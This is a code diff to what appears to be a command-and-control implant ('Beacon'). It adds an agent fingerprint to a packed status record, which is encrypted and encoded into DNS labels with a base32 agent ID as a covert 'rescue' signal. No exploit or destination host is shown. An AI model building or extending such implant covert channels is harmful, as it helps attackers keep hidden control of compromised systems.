@@ -1679,14 +1679,24 @@ _RESCUE_FLAG_DNS_ANSWERED = 0x08
 # version + (class, code-as-two-bytes) per transport + flags. Two bytes for
 # the code because 407 -- a proxy demanding authentication -- does not fit
 # in one, and nor does any three-digit status above 255.
-_RESCUE_STRUCT = struct.Struct("!BBHBHBHBHB")
+_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHB")
+# The key the record travels under; see dns_rescue.WRAPPER_KEY for the
+# arithmetic that chose it over an "action" value.
+_RESCUE_WRAPPER_KEY = "r"
 
 
 
 _RESCUE_MAX_PAYLOAD_CHARS = 126
 
 
-def _rescue_pack(per_transport: dict, flags: int) -> bytes:
+def _rescue_fingerprint(agent_id: str) -> int:
+    """Two bytes identifying which beacon is stuck. See dns_rescue."""
+    digest = hashlib.sha256((agent_id or "").encode("utf-8", "replace"))
+    return int.from_bytes(digest.digest()[:2], "big")
+
+
+def _rescue_pack(per_transport: dict, flags: int,
+                 agent_fingerprint: int = 0) -> bytes:
     """The record, as bytes. Missing transports read as not_attempted.
 
     The copy of `dns_rescue.pack`. It clamps where that one raises: this
@@ -1700,9 +1710,9 @@ def _rescue_pack(per_transport: dict, flags: int) -> bytes:
         klass, code = per_transport.get(name, (0, 0))
         fields.append(max(0, min(int(klass), 0xFF)))
         fields.append(max(0, min(int(code), 0xFFFF)))
-    return _RESCUE_STRUCT.pack(_RESCUE_VERSION, *(fields +
-                                                  [max(0, min(int(flags),
-                                                              0xFF))]))
+    return _RESCUE_STRUCT.pack(
+        _RESCUE_VERSION, max(0, min(int(agent_fingerprint), 0xFFFF)),
+        *(fields + [max(0, min(int(flags), 0xFF))]))
 
 
 def _rescue_to_labels(b64_ciphertext: str):
@@ -4710,14 +4720,16 @@ class Beacon:
         attacker's noise -- so a zone with no room is a configuration fact
         to report, not a payload to mangle.
         """
-        raw = _rescue_pack(self._leg_status, self._rescue_flags)
-        wrapped = self._encrypt({"d": base64.b64encode(raw).decode()})
+        agent = self._agent_id or self._implant_id
+        raw = _rescue_pack(self._leg_status, self._rescue_flags,
+                           _rescue_fingerprint(agent))
+        wrapped = self._encrypt(
+            {_RESCUE_WRAPPER_KEY: base64.b64encode(raw).decode()})
         try:
             one, two = _rescue_to_labels(wrapped)
         except ValueError as exc:
             logger.debug("rescue: %s", exc)
             return None
-        agent = self._agent_id or self._implant_id
         encoded_id = base64.b32encode(
             agent.encode()).decode().rstrip("=").lower()
         name = "%s.%s.%s.%s.%s" % (one, two, encoded_id, _RESCUE_MARKER,
